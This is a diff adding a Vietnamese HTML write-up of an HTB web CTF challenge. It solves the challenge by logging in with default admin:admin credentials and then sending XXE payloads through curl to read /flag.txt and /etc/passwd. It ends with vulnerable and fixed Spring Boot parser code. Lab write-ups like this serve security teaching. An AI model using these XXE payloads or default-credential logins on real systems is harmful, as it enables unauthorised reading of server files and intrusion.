@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Ignite Automation (Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.15rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  .fn { color:#d2a8ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>🔥 Ignite Automation — XXE qua API cập nhật cấu hình XML</h1>
+  <div class="sub">Challenge Web · HTB Event 3692 (NAB Internal CTF, medium) · <span class="muted">target: <code>http://154.57.164.79:33948</code> (docker đã stop sau khi giải)</span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, <b>chưa nộp</b> — bạn tự submit ở portal HTB):<br>
+    <code>HTB{p4rs3d_th3_xml_pull3d_th3_fl4g}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên web (mọi ví dụ tương đồng viết bằng Java Spring Boot) nhưng chưa chuyên sâu bảo mật — mọi thuật ngữ lần đầu xuất hiện đều được giải thích ngay trong bài.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — JWT trong cookie session là gì?</h3>
+<div class="card">
+<p><b>JWT (JSON Web Token)</b> là chuỗi gồm 3 đoạn nối bằng dấu chấm <code>header.payload.signature</code>, mỗi đoạn là Base64URL. Giải mã (bằng tay hoặc <code>jq</code>) ta đọc được payload dạng JSON. Ở bài này server trả cookie <code>session=&lt;JWT&gt;</code> sau khi đăng nhập; JWT chỉ mang <code>{"username":"admin","iat":...}</code> — tức server tin bạn là ai dựa trên chữ ký HS256 của JWT đó.</p>
+<p>Tương đồng Spring Boot: giống hệt session id lưu trong cookie JSESSIONID, chỉ khác là dữ liệu nằm lộ thiên trong token (ký bằng HMAC) thay vì map ngược về session phía server.</p>
+<div class="verify"><b>✔ Cách verify (phân tích tĩnh):</b> khi login thành công bước 1.3, copy phần giữa 2 dấu chấm của cookie <code>session</code>, decode Base64 → thấy JSON <code>{"username":"admin","iat":...}</code> → ghi nhớ: chỉ có claim <code>username</code>, không có role/quyền hạn nào.</div>
+</div>
+
+<h3>0.2 — XXE (XML External Entity) là gì?</h3>
+<div class="card">
+<p><b>XXE</b> là tấn công chèn <b>external entity</b> (thực thể ngoài) vào tài liệu XML. Khi server parse XML bằng parser cho phép đọc thực thể ngoài, ta có thể khai báo thực thể trỏ tới file trên ổ đĩa server (<code>file:///flag.txt</code>) hoặc URL nội bộ, rồi "in" nội dung ra trong response.</p>
+<p>Cú pháp chèn vào đầu tài liệu XML:</p>
+<pre><code><span class="kw">&lt;?xml version="1.0"?&gt;</span>
+<span class="kw">&lt;!DOCTYPE</span> root [
+  <span class="cm">&lt;!-- khai báo thực thể xxe trỏ tới file trên server --&gt;</span>
+  &lt;!ENTITY xxe SYSTEM <span class="st">"file:///flag.txt"</span>&gt;
+]&gt;
+&lt;root&gt;
+  &lt;wrapper&gt;
+    <span class="cm">&lt;!-- dùng &amp;xxe; ở bất kỳ text node nào --&gt;</span>
+    &lt;entry key=<span class="st">"a"</span>&gt;<span class="fn">&amp;xxe;</span>&lt;/entry&gt;
+  &lt;/wrapper&gt;
+&lt;/root&gt;</code></pre>
+<p>Tương đồng Spring Boot: nếu bạn viết <code>@PostMapping</code> nhận <code>@RequestBody String xml</code> rồi <code>DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(...)</code> mặc định — bạn đang mở cửa XXE. Java mặc định (tuỳ JDK) cho phép DOCTYPE và external entities trừ khi bạn tắt bằng <code>setFeature</code>.</p>
+<div class="verify"><b>✔ Cách verify (khái niệm):</b> parser an toàn sẽ ném lỗi khi gặp DOCTYPE; parser không an toàn sẽ im lặng thay <code>&amp;xxe;</code> bằng nội dung file. Ở Phần 3 ta dùng đúng dấu hiệu này để phán đoán.</div>
+</div>
+
+<h3>0.3 — multipart/form-data: file part vs text field</h3>
+<div class="card">
+<p>Form HTML gửi kiểu <code>multipart/form-data</code>, mỗi phần có tên field. Với curl: <code>-F "config=@file.xml"</code> gửi <b>file part</b> (kèm filename, Content-Type riêng), còn <code>-F "config=&lt; file.xml"</code> gửi <b>text field</b> (nội dung file làm giá trị chuỗi, không kèm filename). Server chỉ đọc đúng một trong hai dạng — sai dạng là nhận lỗi ngay, dù nội dung XML y hệt.</p>
+<p>Tương đồng Spring Boot: <code>@RequestParam String config</code> chỉ nhận text field; <code>@RequestParam MultipartFile config</code> chỉ nhận file part. Hai kiểu tham số này không thay thế cho nhau.</p>
+</div>
+
+<h3>0.4 — Các cờ curl dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>-s</code></td><td>im lặng (bỏ progress bar)</td><td>output chỉ còn response body, dễ đọc</td></tr>
+  <tr><td><code>-i</code></td><td>in kèm response header</td><td>đọc Set-Cookie và status code (302 vs 200)</td></tr>
+  <tr><td><code>-b / -c</code></td><td>gửi / lưu cookie jar</td><td>giữ session JWT giữa các request</td></tr>
+  <tr><td><code>-X POST</code></td><td>đổi method</td><td>gọi API login và update config</td></tr>
+  <tr><td><code>-F "config=&lt; f.xml"</code></td><td>multipart text field lấy nội dung từ file</td><td>đúng dạng JS của app gửi (bước 3.2)</td></tr>
+  <tr><td><code>-F "config=@f.xml"</code></td><td>multipart file part</td><td>để demo hướng sai ở Phần 2</td></tr>
+  <tr><td><code>--max-time 20</code></td><td>timeout 20 giây</td><td>tránh treo khi container còn khởi động</td></tr>
+</table>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: đọc app trước khi đánh</h2>
+<p class="muted">Nguyên tắc: mọi lỗ hổng đều lộ qua code client (HTML/JS) trước khi chạm server — đọc hết JS là recon rẻ nhất.</p>
+
+<h3>1.1 — Xem trang chủ</h3>
+<pre><code><span class="cm"># xem header + body trang chủ</span>
+curl -s -i --max-time 20 http://154.57.164.79:33948/ | head -c 3000</code></pre>
+<p>Kết quả: HTTP 200, trang <b>"Gateway Login"</b> với ô username/password, load <code>/static/js/auth.js</code>. Metadata tác giả <code>rayhan0x01</code>.</p>
+<div class="verify"><b>✔ Cách verify:</b> status <code>200 OK</code>; trong body có chuỗi <code>Gateway Login</code> và script <code>src="/static/js/auth.js"</code>.</div>
+
+<h3>1.2 — Đọc auth.js, tìm endpoint login</h3>
+<pre><code><span class="cm"># đọc JS xử lý nút Login → biết endpoint và định dạng body</span>
+curl -s --max-time 20 http://154.57.164.79:33948/static/js/auth.js</code></pre>
+<p>Phát hiện: nút Login gọi <code>POST /api/login</code> với body JSON <code>{"username":..., "password":...}</code>; thành công thì redirect <code>/dashboard</code>.</p>
+<div class="verify"><b>✔ Cách verify (phân tích tĩnh):</b> ghi nhớ endpoint <code>/api/login</code> và body JSON cho bước 1.3; ghi nhớ <code>/dashboard</code> cần session.</div>
+
+<h3>1.3 — Thử đăng nhập tài khoản mặc định admin:admin</h3>
+<pre><code><span class="cm"># login admin:admin, lưu cookie jar để dùng cho các bước sau</span>
+curl -s -c ignite_cookies.txt --max-time 20 \
+  -X POST http://154.57.164.79:33948/api/login \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"username":"admin","password":"admin"}'</span></code></pre>
+<p>Kết quả:</p>
+<pre><code>{<span class="st">"message":"User authenticated successfully!"</span>}</code></pre>
+<p>Header có <code>Set-Cookie: session=eyJhbGciOiJIUzI1Ni...</code> — JWT HS256. Payload decode ra: <code>{"username":"admin","iat":1792743167}</code>.</p>
+<div class="verify"><b>✔ Cách verify:</b> status 200, body chứa <code>User authenticated successfully!</code>; file <code>ignite_cookies.txt</code> tồn tại và chứa dòng <code>session</code>. Decode Base64 phần payload JWT → thấy <code>username: admin</code>.</div>
+
+<h3>1.4 — Truy cập /dashboard và đọc dashboard.js</h3>
+<pre><code><span class="cm"># vào dashboard bằng cookie vừa lấy</span>
+curl -s -b ignite_cookies.txt --max-time 20 \
+  http://154.57.164.79:33948/dashboard -o dashboard.html -w <span class="st">"HTTP %{http_code}\n"</span></code></pre>
+<p>Kết quả: HTTP 200, trang <b>"EagleFuel HMI"</b> — dashboard giám sát trạm dầu khí dạng SCADA (hệ thống điều khiển giám sát công nghiệp). Menu navbar có thêm link <code>/settings</code> (System Settings).</p>
+<pre><code><span class="cm"># đọc dashboard.js xem có API nào gọi ngầm không</span>
+curl -s -b ignite_cookies.txt --max-time 20 \
+  http://154.57.164.79:33948/static/js/dashboard.js</code></pre>
+<p>Kết quả: toàn bộ JS chỉ random số hiển thị và vẽ bản đồ Leaflet — <b>không gọi API nào</b>. Dashboard là dead-end về mặt tấn công.</p>
+<div class="verify"><b>✔ Cách verify:</b> <code>dashboard.html</code> chứa chuỗi <code>System Settings</code> và href <code>/settings</code>; <code>dashboard.js</code> không chứa <code>fetch('/api</code> nào ngoài tile map.</div>
+
+<h3>1.5 — Vào /settings: phát hiện API cấu hình XML</h3>
+<pre><code><span class="cm"># tải trang settings + JS của nó</span>
+curl -s -b ignite_cookies.txt --max-time 20 \
+  http://154.57.164.79:33948/settings -o settings.html
+curl -s -b ignite_cookies.txt --max-time 20 \
+  http://154.57.164.79:33948/static/js/settings.js</code></pre>
+<p>Hai phát hiện quan trọng:</p>
+<ul class="dash">
+  <li>Trang <code>/settings</code> hiển thị <b>"Global Configuration"</b> — một tài liệu XML gồm các <code>&lt;entry key="wrapper.*"&gt;</code> (cấu hình kiểu Java Service Wrapper của Tanuki, dùng cho app Java chạy như dịch vụ). Có nút <b>"Update Configuration"</b>.</li>
+  <li><code>settings.js</code> gọi <code>GET /api/global-config</code> để load config, và <code>POST /api/global-config</code> — gửi multipart form field tên <code>config</code> chứa <b>toàn bộ nội dung XML</b> (bằng <code>FormData.append('config', stringXml)</code> — tức text field, không phải file).</li>
+</ul>
+<div class="verify"><b>✔ Cách verify:</b> <code>settings.html</code> chứa <code>&lt;entry key="wrapper.java.command"&gt;</code>; <code>settings.js</code> chứa <code>fetch('/api/global-config', { method: 'POST', body: formData })</code>. Ghi nhớ: server <b>nhận XML từ client và parse nó</b> — đây là bề mặt tấn công.</div>
+
+<h2 id="p2">Phần 2 — Các hướng tấn công trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Phải chứng minh đường tắt không đi được trước khi đi đường vòng — tránh ấn tượng "đoán trúng ngay".</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.1 — Gửi XXE dạng file part (<code>-F "config=@file"</code>)</h3>
+<pre><code><span class="cm"># chuẩn bị payload XXE đọc /flag.txt</span>
+printf <span class="st">'&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;]&gt;&lt;root&gt;&lt;wrapper&gt;&lt;entry key="a"&gt;&amp;xxe;&lt;/entry&gt;&lt;/wrapper&gt;&lt;/root&gt;</span>' &gt; xxe.xml
+
+<span class="cm"># gửi dạng FILE part — đây là cách gửi "tự nhiên" nhất khi có sẵn file</span>
+curl -s -b ignite_cookies.txt --max-time 20 \
+  -X POST http://154.57.164.79:33948/api/global-config \
+  -F <span class="st">"config=@xxe.xml"</span></code></pre>
+<p>Kết quả thật:</p>
+<pre><code>{<span class="st">"message":"Bad request!"</span>}</code></pre>
+<p>Kết luận: <b>không phải XXE bị chặn</b> — mà là multipart sai dạng. Server chỉ đọc text field <code>config</code> (như JS gửi), file part bị từ chối từ lớp parse form, chưa tới lớp parse XML. Chuyển sang gửi đúng dạng text field ở Phần 3.</p>
+<div class="verify"><b>✔ Cách verify:</b> lỗi <code>Bad request!</code> xuất hiện kể cả khi gửi XML hợp lệ không XXE dạng file part → lỗi nằm ở lớp multipart, không liên quan nội dung XML.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.2 — Tìm đường tắt từ dashboard</h3>
+<pre><code><span class="cm"># grep toàn bộ endpoint / JS có trong dashboard.html</span>
+grep -oE <span class="st">'/api/[a-zA-Z0-9_/.-]+|src="[^"]*\.js"'</span> dashboard.html | sort -u</code></pre>
+<p>Kết quả thật: chỉ có <code>/settings</code>, <code>inspect(0)</code> (hàm JS thuần hiển thị), và 4 file JS thư viện. Không có API nào khác.</p>
+<p>Kết luận: dashboard hoàn toàn tĩnh — mọi hy vọng nằm ở <code>/api/global-config</code> từ trang settings. Tập trung toàn lực vào đó.</p>
+<div class="verify"><b>✔ Cách verify:</b> output grep không chứa <code>/api/</code> nào ngoài những gì đã liệt kê — so với settings.js có <code>/api/global-config</code>.</div>
+
+<h2 id="p3">Phần 3 — Đột phá: XXE file:///flag.txt qua đúng dạng multipart</h2>
+
+<h3>3.1 — Chuẩn bị payload XXE</h3>
+<pre><code><span class="cm"># tạo file payload XXE: DOCTYPE khai báo entity xxe → file:///flag.txt</span>
+cat &gt; xxe.xml <span class="st">&lt;&lt;'EOF'
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;]&gt;
+&lt;root&gt;
+  &lt;wrapper&gt;
+    &lt;entry key="a"&gt;&amp;xxe;&lt;/entry&gt;
+  &lt;/wrapper&gt;
+&lt;/root&gt;
+EOF</span></code></pre>
+<p>Giải thích từng mảnh: <code>DOCTYPE root [ ... ]</code> chèn DTD nội tuyến; <code>&lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;</code> khai báo thực thể ngoài tên <code>xxe</code> trỏ tới file trên ổ đĩa server; <code>&amp;xxe;</code> là chỗ parser sẽ thay bằng nội dung file. Đề bài nói rõ flag nằm ở <code>/flag.txt</code>.</p>
+<div class="verify"><b>✔ Cách verify (phân tích tĩnh):</b> mở <code>xxe.xml</code> bằng trình đọc XML offline bình thường sẽ báo không resolve được <code>file:///flag.txt</code> (đúng — vì file đó ở server, không ở máy mình) — chứng tỏ cú pháp entity đúng chuẩn.</div>
+
+<h3>3.2 — Gửi đúng dạng text field: <code>-F "config=&lt; xxe.xml"</code></h3>
+<pre><code><span class="cm"># dấu &lt; sau dấu = : lấy NỘI DUNG file làm giá trị text field (không kèm filename)</span>
+<span class="cm"># đây là dạng giống hệt FormData.append('config', stringXml) của trình duyệt</span>
+curl -s -b ignite_cookies.txt --max-time 20 \
+  -X POST http://154.57.164.79:33948/api/global-config \
+  -F <span class="st">"config=&lt; xxe.xml"</span></code></pre>
+<p>Kết quả thật:</p>
+<pre><code>{<span class="st">"message":"Configuration updated successfully"</span>,<span class="st">"entries"</span>:{<span class="st">"a"</span>:<span class="st">"HTB{p4rs3d_th3_xml_pull3d_th3_fl4g}"</span>}}</code></pre>
+<p>Parser server <b>không tắt external entities</b> → <code>&amp;xxe;</code> được thay bằng toàn bộ nội dung <code>/flag.txt</code>, rồi server phản chiếu lại giá trị entry trong JSON response. Flag xuất hiện ngay trong <code>entries.a</code>.</p>
+<div class="verify"><b>✔ Cách verify:</b> status 200, body JSON có <code>"message":"Configuration updated successfully"</code> và trường <code>entries</code> chứa chuỗi <code>HTB{...}</code>. So sánh với Phần 2.1 (cùng file xxe.xml, chỉ khác cách đính kèm): lần này không còn <code>Bad request!</code> → kết luận chắc chắn lỗi lúc trước nằm ở multipart, XXE hoạt động.</div>
+
+<h2 id="p4">Phần 4 — Kết liễu: kiểm chứng quyền đọc file tùy ý</h2>
+
+<h3>4.1 — Kiểm chứng 3 trạng thái của parser</h3>
+<pre><code><span class="cm"># (a) XML hợp lệ, không XXE → server parse bình thường</span>
+printf <span class="st">'&lt;root&gt;&lt;wrapper&gt;&lt;entry key="test"&gt;hello&lt;/entry&gt;&lt;/wrapper&gt;&lt;/root&gt;</span>' &gt; ok.xml
+curl -s -b ignite_cookies.txt --max-time 15 \
+  -X POST http://154.57.164.79:33948/api/global-config \
+  -F <span class="st">"config=&lt; ok.xml"</span>
+<span class="cm"># → {"message":"Configuration updated successfully","entries":{"test":"hello"}}</span>
+
+<span class="cm"># (b) XML rác → server lộ lỗi parser (libxml2 kiểu)</span>
+printf <span class="st">'not xml at all'</span> &gt; bad.xml
+curl -s -b ignite_cookies.txt --max-time 15 \
+  -X POST http://154.57.164.79:33948/api/global-config \
+  -F <span class="st">"config=&lt; bad.xml"</span>
+<span class="cm"># → {"message":"Error: Start tag expected, '&lt;' not found\n"}</span>
+
+<span class="cm"># (c) XXE đọc /etc/passwd → chứng minh đọc ĐƯỢC file tùy ý, không phải riêng flag.txt</span>
+printf <span class="st">'&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&lt;wrapper&gt;&lt;entry key="p"&gt;&amp;xxe;&lt;/entry&gt;&lt;/wrapper&gt;&lt;/root&gt;</span>' &gt; passwd.xml
+curl -s -b ignite_cookies.txt --max-time 15 \
+  -X POST http://154.57.164.79:33948/api/global-config \
+  -F <span class="st">"config=&lt; passwd.xml"</span>
+<span class="cm"># → entries.p chứa toàn bộ /etc/passwd (root:x:0:0:...)</span></code></pre>
+<p>Ý nghĩa: (a)+(b) cho thấy server parse XML thật và phản chiếu entry; (c) cho thấy đây là <b>arbitrary file read</b> thật sự — đọc được mọi file server có quyền đọc. Flag lấy ở bước 3.2 đã đủ.</p>
+<div class="verify"><b>✔ Cách verify:</b> (a) entries.test = <code>hello</code>; (b) message bắt đầu bằng <code>Error: Start tag expected</code>; (c) entries.p bắt đầu bằng <code>root:x:0:0:root:/root:/bin/bash</code>. Cả ba đúng → kết luận arbitrary file read vững.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+  <tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Login <code>admin:admin</code> qua <code>POST /api/login</code></td><td>thử credential mặc định trên form login</td><td>200 + cookie JWT + message "authenticated successfully"</td></tr>
+  <tr><td>2</td><td>Vào <code>/settings</code>, đọc <code>settings.js</code></td><td>navbar link System Settings</td><td>settings.js gọi GET/POST <code>/api/global-config</code> bằng FormData text field</td></tr>
+  <tr><td>3</td><td>POST XXE <code>file:///flag.txt</code> dạng <code>-F "config=&lt; xxe.xml"</code></td><td>server parse XML client gửi lên, không tắt external entity</td><td>response <code>entries.a</code> chứa <code>HTB{...}</code></td></tr>
+  <tr><td>4</td><td>Đối chứng 3 trạng thái parser</td><td>cần loại trừ "server chỉ echo lại chuỗi"</td><td>ok.xml parse được / bad.xml lỗi parser / passwd.xml đọc được /etc/passwd</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Spring Boot</h2>
+
+<h3>Lỗi 1 — XML parser mặc định cho phép external entities</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Code sai — DocumentBuilderFactory mặc định chấp nhận DOCTYPE + external entity</div>
+  <div class="bd"><pre><code><span class="kw">@PostMapping</span>(<span class="st">"/api/global-config"</span>)
+<span class="kw">public</span> Map&lt;String, Object&gt; updateConfig(<span class="kw">@RequestParam</span> String config) <span class="kw">throws</span> Exception {
+    <span class="cm">// DÒNG GÂY LỖI: newInstance() mặc định không tắt DTD/entity ngoài</span>
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.<span class="fn">newInstance</span>();
+    Document doc = dbf.<span class="fn">newDocumentBuilder</span>().<span class="fn">parse</span>(
+        <span class="kw">new</span> InputSource(<span class="kw">new</span> StringReader(config)));
+
+    Map&lt;String, String&gt; entries = <span class="kw">new</span> LinkedHashMap&lt;&gt;();
+    NodeList list = doc.<span class="fn">getElementsByTagName</span>(<span class="st">"entry"</span>);
+    <span class="kw">for</span> (<span class="kw">int</span> i = 0; i &lt; list.<span class="fn">getLength</span>(); i++) {
+        Element e = (Element) list.<span class="fn">item</span>(i);
+        entries.<span class="fn">put</span>(e.<span class="fn">getAttribute</span>(<span class="st">"key"</span>), e.<span class="fn">getTextContent</span>()); <span class="cm">// ← phản chiếu nội dung file ra response</span>
+    }
+    <span class="kw">return</span> Map.<span class="fn">of</span>(<span class="st">"message"</span>, <span class="st">"Configuration updated successfully"</span>, <span class="st">"entries"</span>, entries);
+}</code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Code sửa — tắt hoàn toàn DTD và external entities</div>
+  <div class="bd"><pre><code>DocumentBuilderFactory dbf = DocumentBuilderFactory.<span class="fn">newInstance</span>();
+dbf.<span class="fn">setFeature</span>(<span class="st">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="kw">true</span>);
+dbf.<span class="fn">setFeature</span>(<span class="st">"http://xml.org/sax/features/external-general-entities"</span>, <span class="kw">false</span>);
+dbf.<span class="fn">setFeature</span>(<span class="st">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="kw">false</span>);
+dbf.<span class="fn">setXIncludeAware</span>(<span class="kw">false</span>);
+dbf.<span class="fn">setExpandEntityReferences</span>(<span class="kw">false</span>);
+<span class="cm">// Hoặc chặn từ đầu: chỉ nhận format an toàn hơn (JSON/YAML) thay vì XML do client tự ý gửi</span></code></pre></div>
+</div>
+<p>Điểm mấu chốt: app không chỉ parse XML — nó <b>phản chiếu text content</b> ra response (<code>entries</code>), nên XXE biến thành file read có "màn hình xuất". Nếu parser an toàn (chặn DOCTYPE), payload ở bước 3.2 sẽ ném exception ngay từ lớp parse.</p>
+
+<h3>Lỗi 2 — Credential mặc định + endpoint nhạy cảm chỉ dựa vào session</h3>
+<div class="spring bad-ex">
+  <div class="hd">❌ Code sai — tài khoản admin mặc định, không đổi mật khẩu lần đầu</div>
+  <div class="bd"><pre><code><span class="cm">// seed data khởi tạo: admin / admin — không bắt buộc đổi khi login lần đầu</span>
+userRepository.<span class="fn">save</span>(<span class="kw">new</span> User(<span class="st">"admin"</span>, passwordEncoder.<span class="fn">encode</span>(<span class="st">"admin"</span>)));</code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Code sửa — bắt đổi mật khẩu + phân quyền endpoint cấu hình</div>
+  <div class="bd"><pre><code><span class="cm">// 1. Force đổi mật khẩu ở login đầu tiên (flag mustChangePassword)</span>
+<span class="cm">// 2. Endpoint cấu hình chỉ cho role cao nhất, không phải mọi user đã login:</span>
+<span class="kw">@PostMapping</span>(<span class="st">"/api/global-config"</span>)
+<span class="kw">@PreAuthorize</span>(<span class="st">"hasRole('SYSTEM_ADMIN')"</span>)
+<span class="kw">public</span> ...</code></pre></div>
+</div>
+<p>Ở bài này, <code>admin:admin</code> mở được cửa đầu tiên. JWT chỉ chứa <code>username</code> không chứa role — may mắn là endpoint cấu hình không kiểm tra gì thêm, chứ nếu kiểm tra theo role thì JWT này cũng không đủ.</p>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>Đọc hết JS trước khi đánh.</b> auth.js cho endpoint login, settings.js cho endpoint XXE — cả hai đều lộ từ code client, không cần fuzz.</li>
+  <li><b>Thử credential mặc định sớm.</b> admin:admin mở toàn bộ app; thất bại cũng chỉ tốn 1 request.</li>
+  <li><b>Thấy XML là nghĩ XXE.</b> Mọi nơi server parse XML do client gửi đều cần thử DOCTYPE + SYSTEM entity trước — đây là top lỗi parser.</li>
+  <li><b>Sai dạng multipart ≠ bị chặn.</b> "Bad request!" khi gửi file part dạng text field cho thấy lỗi ở lớp form, không phải lớp XML — đừng kết luận vội "payload sai".</li>
+  <li><b>Đối chứng parser bằng 3 trạng thái.</b> XML tốt / XML rác / XXE file hệ thống — chỉ khi cả ba đúng kỳ vọng mới kết luận arbitrary file read.</li>
+  <li><b>Thông báo lỗi chi tiết giúp attacker.</b> Server trả nguyên message của libxml2 ("Start tag expected") — lộ cả thư viện parser đang dùng, gợi ý cách khai thác tiếp.</li>
+  <li><b>Checklist tự làm lại:</b> spawn → đọc auth.js → login admin:admin → đọc settings.js → chuẩn bị xxe.xml → POST đúng dạng <code>-F "config=&lt; xxe.xml"</code> → verify bằng /etc/passwd → lấy flag → stop docker → tự submit.</li>
+</ol>
+</div>
+
+<p class="muted" style="margin-top:40px">Flag <code>HTB{p4rs3d_th3_xml_pull3d_th3_fl4g}</code> đã lấy thành công nhưng <b>chưa nộp</b> — bạn tự submit ở portal HTB. Docker của challenge đã stop sau khi giải xong. Chúc mừng!</p>
+
+</div>
+</body>
+</html>
